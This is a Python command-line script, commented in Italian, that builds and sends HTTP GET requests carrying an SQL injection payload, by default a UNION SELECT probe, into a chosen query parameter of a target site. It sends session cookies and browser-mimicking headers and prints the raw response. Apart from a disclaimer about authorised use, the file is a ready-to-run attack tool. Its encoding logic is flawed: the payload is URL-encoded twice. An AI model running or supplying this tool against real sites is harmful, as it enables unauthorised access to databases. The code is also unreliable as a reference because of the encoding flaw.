"""
SQL Injection Tester - Script per test di sicurezza in ambienti controllati
Utilizzare esclusivamente in ambienti di proprietà o autorizzati.
"""

import socket
import argparse
import urllib.parse
import ssl
import sys

def get_request(host, url, parameter, sql_injection, cookie, user_agent=None):
    """
    Costruisce una richiesta HTTP GET con SQL injection nel parametro specificato.
    
    Args:
        host (str): Host del server target
        url (str): URL completa della risorsa
        parameter (str): Parametro della query string da injectare
        sql_injection (str): Payload SQL da iniettare
        cookie (str): Cookie di sessione per l'autenticazione
        user_agent (str, optional): User-Agent personalizzato
    
    Returns:
        str: Richiesta HTTP formattata con l'injection, oppure None in caso di errore
    """
    
    # Codifica il payload SQL per essere sicuro in un URL
    # %20 per spazi, %27 per apostrofi, etc.
    injection_encoded = urllib.parse.quote_plus(sql_injection)
    
    # Analizza l'URL per separare i componenti (schema, netloc, path, query, etc.)
    parsed_url = urllib.parse.urlparse(url)
    
    # Estrae i parametri della query string e li trasforma in un dizionario
    # doseq=True mantiene i valori come liste se ci sono parametri duplicati
    query_params = urllib.parse.parse_qs(parsed_url.query)
    
    # Verifica che il parametro da injectare esista effettivamente nell'URL
    if parameter not in query_params:
        print(f"[!] Errore: Parametro {parameter} non trovato nell'URL")
        return None

    # Sostituisce il valore del parametro con il payload SQL codificato
    query_params[parameter] = injection_encoded
    
    # Ricostruisce la query string con il nuovo valore injectato
    new_query = urllib.parse.urlencode(query_params, doseq=True)
    
    # Ricostruisce l'URL completo con la nuova query string
    new_url = urllib.parse.urlunparse((
        parsed_url.scheme,      # http o https
        parsed_url.netloc,      # dominio:porta
        parsed_url.path,        # percorso della risorsa
        parsed_url.params,      # parametri aggiuntivi (rari)
        new_query,              # nuova query string con injection
        parsed_url.fragment     # anchor (dopo #)
    ))

    # Headers HTTP della richiesta - importanti per apparire come browser legittimo
    headers = {
        "Host": host,  # Header Host obbligatorio per HTTP/1.1
        "User-Agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "close",  # Chiude la connessione dopo la risposta
        "Cookie": cookie        # Cookie di sessione per mantenere l'autenticazione
    }

    # Costruzione della richiesta HTTP completa
    request = f"GET {new_url} HTTP/1.1\r\n"
    # Aggiunge tutti gli headers, uno per linea
    request += "\r\n".join(f"{k}: {v}" for k, v in headers.items())
    # Due righe vuote indicano la fine degli headers e l'inizio del body (se presente)
    request += "\r\n\r\n"
    
    return request

def main():
    """
    Funzione principale che gestisce gli argomenti da riga di comando
    e esegue l'attacco di SQL injection.
    """
    
    # Configurazione del parser degli argomenti da riga di comando
    parser = argparse.ArgumentParser(
        description='SQL Injection Tester - Per uso esclusivo in ambienti autorizzati',
        epilog='Esempio: python script.py --host example.com -u "http://example.com/search?q=test" --param q'
    )
    
    # Definizione degli argomenti supportati dallo script
    parser.add_argument('--host', required=True, help='Indirizzo IP o dominio del server target')
    parser.add_argument('-u', '--url', required=True, help='URL completa da testare (inclusi parametri)')
    parser.add_argument('--param', required=True, help='Parametro della query string da injectare')
    parser.add_argument('--cookie', default='', help='Cookie di sessione per richieste autenticate')
    parser.add_argument('--ssl', action='store_true', help='Utilizza HTTPS invece di HTTP')
    parser.add_argument('--port', type=int, default=None, help='Porta personalizzata (default: 80 per HTTP, 443 per HTTPS)')
    parser.add_argument('--payload', default="' UNION SELECT 1,2,3-- -", help='Payload SQL personalizzato')
    
    # Parsing degli argomenti forniti dall'utente
    args = parser.parse_args()

    # Imposta la porta predefinita in base al protocollo scelto
    if not args.port:
        args.port = 443 if args.ssl else 80

    # Configurazione e invio della richiesta
    try:
        # Gestione connessioni SSL/HTTPS
        if args.ssl:
            # Crea un contesto SSL predefinito (verifica certificati)
            context = ssl.create_default_context()
            
            # Crea una connessione TCP base
            with socket.create_connection((args.host, args.port), timeout=10) as sock:
                # Avvolge il socket in un layer SSL
                with context.wrap_socket(sock, server_hostname=args.host) as tcp_socket:
                    # Costruisce la richiesta HTTP con l'injection
                    request = get_request(args.host, args.url, args.param, args.payload, args.cookie)
                    if not request:
                        return  # Esce se c'è stato un errore nella costruzione
                    
                    print("[*] Invio richiesta SQL injection...")
                    print("=" * 50)
                    print(request)
                    print("=" * 50)
                    
                    # Invia la richiesta al server
                    tcp_socket.sendall(request.encode())
                    
                    # Riceve la risposta dal server
                    response = b""
                    while True:
                        data = tcp_socket.recv(4096)  # Buffer di 4KB
                        if not data:
                            break
                        response += data
        
        # Gestione connessioni HTTP normali
        else:
            with socket.create_connection((args.host, args.port), timeout=10) as tcp_socket:
                request = get_request(args.host, args.url, args.param, args.payload, args.cookie)
                if not request:
                    return
                    
                print("[*] Invio richiesta SQL injection...")
                print("=" * 50)
                print(request)
                print("=" * 50)
                
                tcp_socket.sendall(request.encode())
                response = b""
                while True:
                    data = tcp_socket.recv(4096)
                    if not data:
                        break
                    response += data

        # Stampa la risposta del server
        print("[*] Risposta dal server:")
        print("=" * 50)
        try:
            # Prova a decodificare come UTF-8, ignora caratteri non decodificabili
            print(response.decode('utf-8', errors='ignore'))
        except UnicodeDecodeError:
            # Se UTF-8 fallisce, stampa come stringa di byte
            print(response)

    # Gestione degli errori di connessione
    except socket.timeout:
        print("[!] Timeout: Il server non ha risposto entro 10 secondi")
    except socket.gaierror:
        print("[!] Errore DNS: Impossibile risolvere l'hostname")
    except ConnectionRefusedError:
        print("[!] Connessione rifiutata: Il server non accetta connessioni sulla porta specificata")
    except ssl.SSLError as e:
        print(f"[!] Errore SSL: {e}")
    except Exception as e:
        print(f"[!] Errore imprevisto: {e}")

# Punto di ingresso dello script
if __name__ == "__main__":
    main()
